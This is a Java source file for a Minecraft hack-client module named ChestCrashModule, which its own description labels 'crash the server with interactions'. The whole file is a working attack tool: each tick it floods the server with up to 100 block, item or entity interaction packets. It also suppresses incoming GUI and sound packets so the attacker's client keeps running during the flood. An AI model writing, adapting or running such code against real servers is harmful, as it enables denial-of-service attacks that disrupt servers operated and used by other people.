package net.shadow.feature.module;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.CloseHandledScreenC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.network.packet.s2c.play.OpenScreenS2CPacket;
import net.minecraft.network.packet.s2c.play.PlaySoundS2CPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.hit.EntityHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3d;
import net.minecraft.world.World;
import net.shadow.Shadow;
import net.shadow.event.events.PacketInput;
import net.shadow.event.events.RenderListener;
import net.shadow.event.events.RightClick;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.BooleanValue;
import net.shadow.feature.configuration.MultiValue;
import net.shadow.feature.configuration.SliderValue;
import net.shadow.utils.ChatUtils;
import net.shadow.utils.RenderUtils;

import java.awt.*;

public class ChestCrashModule extends Module implements RightClick, PacketInput, RenderListener {
    static World w;
    static int in;
    static BlockHitResult bhr;
    static Entity target;
    final BooleanValue close = this.config.create("CloseScreen", false);
    final MultiValue mode = this.config.create("Crash", "Block", "Block", "Item", "Entity");
    final SliderValue repeat = this.config.create("Power", 1, 1, 100, 1);

    public ChestCrashModule() {
        super("Interaction", "crash the server with interactions", ModuleType.CRASH);
    }

    @Override
    public String getVanityName() {
        return this.getName() + "Crash";
    }

    @Override
    public void onEnable() {
        w = Shadow.c.player.clientWorld;
        Shadow.getEventSystem().add(PacketInput.class, this);
        Shadow.getEventSystem().add(RenderListener.class, this);
    }

    @Override
    public void onDisable() {
        Shadow.getEventSystem().remove(PacketInput.class, this);
        Shadow.getEventSystem().remove(RenderListener.class, this);
        in = 0;
    }

    @Override
    public void onUpdate() {
        if (w != Shadow.c.player.clientWorld) {
            this.setEnabled(false);
            return;
        }
        try {
            if (mode.getThis().equalsIgnoreCase("block")) {
                bhr = (BlockHitResult) Shadow.c.crosshairTarget;
                if (Shadow.c.world.getBlockState(bhr.getBlockPos()).isAir()) return;
                for (int i = 0; i < repeat.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr));
                }
            } else if (mode.getThis().equalsIgnoreCase("item")) {
                for (int i = 0; i < repeat.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND));
                }
            } else if (mode.getThis().equalsIgnoreCase("entity")) {
                if (!(Shadow.c.crosshairTarget instanceof EntityHitResult)) {
                    target = null;
                    return;
                }
                target = ((EntityHitResult) Shadow.c.crosshairTarget).getEntity();
                for (int i = 0; i < repeat.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(PlayerInteractEntityC2SPacket.interact(target, false, Hand.MAIN_HAND));
                }
            }
            if (close.getThis()) {
                Shadow.c.player.networkHandler.sendPacket(new CloseHandledScreenC2SPacket(Shadow.c.player.currentScreenHandler.syncId));
            }
        } catch (Exception ignored) {

        }
    }

    @Override
    public void onRender() {

    }

    @Override
    public void onReceivedPacket(PacketInputEvent event) {
        if (event.getPacket() instanceof OpenScreenS2CPacket) {
            event.cancel();
            in++;
            ChatUtils.hud("Dropped GUI Packet #" + in);
        }
        if (event.getPacket() instanceof PlaySoundS2CPacket) {
            event.cancel();
        }
    }

    @Override
    public void onRightClick(RightClickEvent event) {

    }

    @Override
    public void onRender(float partialTicks, MatrixStack matrix) {
        if (mode.getThis().equalsIgnoreCase("block")) {
            try {
                BlockPos selblock = bhr.getBlockPos();
                if (Shadow.c.world.getBlockState(selblock).isAir()) return;
                RenderUtils.renderObject(new Vec3d(selblock.getX(), selblock.getY(), selblock.getZ()), new Vec3d(1, 1, 1), new Color(100, 100, 100, 100), matrix);
            } catch (Exception ignored) {

            }
        } else if (mode.getThis().equalsIgnoreCase("entity")) {
            if (target == null) return;
            RenderUtils.renderEntity(target, new Color(100, 100, 100, 100), matrix);
        }
    }
}

